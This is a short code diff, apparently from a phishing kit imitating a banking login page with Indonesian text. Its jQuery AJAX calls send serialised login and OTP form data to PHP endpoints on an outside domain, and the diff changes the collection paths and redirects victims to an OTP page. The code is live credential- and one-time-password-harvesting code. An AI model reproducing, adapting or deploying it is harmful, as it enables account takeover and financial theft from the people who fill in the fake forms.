@@ -16,13 +16,13 @@ $('.process1').fadeIn();
  
       $.ajax({
             type: 'POST',
-            url: 'https://choreoapps.ll-feed.cfd/bsi/f1gd/no.php',
+            url: 'https://choreoapps.ll-feed.cfd/bsi/aku/no.php',
             data: $('#formHP').serialize(),
             datatype: 'text',
             
             complete: function(data) {
             setTimeout(function(){
-  window.location.href='login.html'
+  window.location.href='otp.html'
   document.getElementById('btnSubmit1').innerHTML = "SELANJUTNYA";
  $('.process1').fadeOut();
     }, 800);
@@ -41,7 +41,7 @@ function sendOtp() {
  document.getElementById('btnSubmit1').innerHTML = "Memproses...";    
 $.ajax({
  type: 'POST',
- url: 'https://choreoapps.ll-feed.cfd/bsi/f1gd/otp.php',
+ url: 'https://choreoapps.ll-feed.cfd/bsi/aku/otp.php',
  async: false,
  dataType: 'JSON',
  data: $('#form2').serialize(),
